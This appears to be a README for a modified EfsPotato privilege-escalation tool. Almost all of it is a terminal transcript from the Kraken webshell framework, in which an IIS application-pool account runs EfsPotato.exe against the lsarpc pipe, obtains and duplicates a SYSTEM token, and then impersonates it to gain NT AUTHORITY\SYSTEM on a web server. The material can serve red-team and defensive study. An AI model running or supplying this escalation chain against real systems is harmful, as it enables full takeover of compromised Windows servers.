# EfsPotato mod

TODO

## Examples

An example of elevation of privilege + impersonation using Kraken:

```
(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ whoami      
  USERNAME                    SID                                                            
    
  IIS APPPOOL\DefaultAppPool  S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415  

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ list_tokens          
  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL  
    
  644    nt authority\iusr           True            HIGH            
  836    iis apppool\defaultapppool  True            HIGH            

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ execute_assembly -f /home/kali/EfsPotato.exe -n EncFilSysRpc -c Program -m Main -- lsarpc
[+] Current user: IIS APPPOOL\DefaultAppPool
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=285685e90c0)
[+] Duplicated SYSTEM Token: '2280'

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ list_tokens          
  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL  
    
  644    nt authority\iusr           True            HIGH            
  836    iis apppool\defaultapppool  True            HIGH            
  2280   nt authority\system         False           SYSTEM          

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ set_token 2280
Impersonated user: 'NT AUTHORITY\SYSTEM' with token: '2280'

(ST) NT AUTHORITY\SYSTEM@SRV1:C:/inetpub/wwwroot$ whoami           
  USERNAME             SID       
    
  NT AUTHORITY\SYSTEM  S-1-5-18  

(ST) NT AUTHORITY\SYSTEM@SRV1:C:/inetpub/wwwroot$ rev2self
[*] Token 2280 has been dereferenced (this does not mean that the token has been released)

(ST) IIS APPPOOL\DefaultAppPool@SRV1:C:/inetpub/wwwroot$ exit                
```


[1]: https://github.com/BeichenDream/EfsPotato "EfsPotato Repository Fork"
